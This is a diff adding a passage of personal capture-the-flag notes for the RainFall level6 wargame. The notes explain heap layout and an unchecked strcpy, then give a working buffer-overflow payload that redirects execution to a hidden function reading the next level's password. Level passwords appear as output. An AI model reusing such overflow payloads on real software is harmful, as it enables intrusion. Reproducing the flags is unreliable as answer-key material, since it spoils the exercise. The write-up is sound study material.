@@ -674,3 +674,63 @@ cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 ## level6
+Segfauts as soon as it is executed, the fuck
+```
+call    malloc 
+```
+**omg, kill me**
+## heap
+An executable file, such as ELF, has several sections:
+```
+PLT (Procedure Linking Table)
+GOT (Global Offset Table)
+init (instructions executed on initialization)
+fini (instructions to be executed upon termination)
+ctors and dtors (global constructors/destructors)
+```
+**The heap is an area in memory that is dynamically allocated by the application. The data section initialized at compile-time.**
+
+**The bss section contains uninitialized data, and is allocated at run-time.  Until it is written to, it remains zeroed (or at least from the application's point-of-view).**
+
+The heap grows up (towards higher addresses).  Hence, when we say "X is below Y," it means X is lower in memory than Y.
+
+*stolen from **https://www.cgsecurity.org/exploit/heaptut.txt***
+
+## I'm a fucking idiot why did I see malloc and freak out
+**strcpy**, 
+
+strcpy(buf, buf2)
+```
+No boundary check.
+It copies the content of buf2(until reaching NULL byte) which may be longer than length(buf) to buf.
+Therefore, it may happen overflow.
+pwnable
+```
+There is a function **n** thats called nowhere, and has a little 
+```
+mov     dword [esp {var_1c}], data_80485b0  {"/bin/cat /home/user/level7/.pass"} call    system 
+```
+of address
+```
+(gdb) x n
+0x8048454 <n>:  0x83e58955
+```
+there is also a call to eax
+```
+call    eax
+```
+inside the main function, offset is 72
+```
+level6@RainFall:~$ cat <(python -c "print 'A'*72 + '\x54\x84\x04\x08'") - | ./level6 
+ll
+Segmentation fault (core dumped)
+```
+**UUUH, THE FUCK**
+
+oh uses argv1, pushed
+
+goes to eax, then eax is called
+```
+level6@RainFall:~$ ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
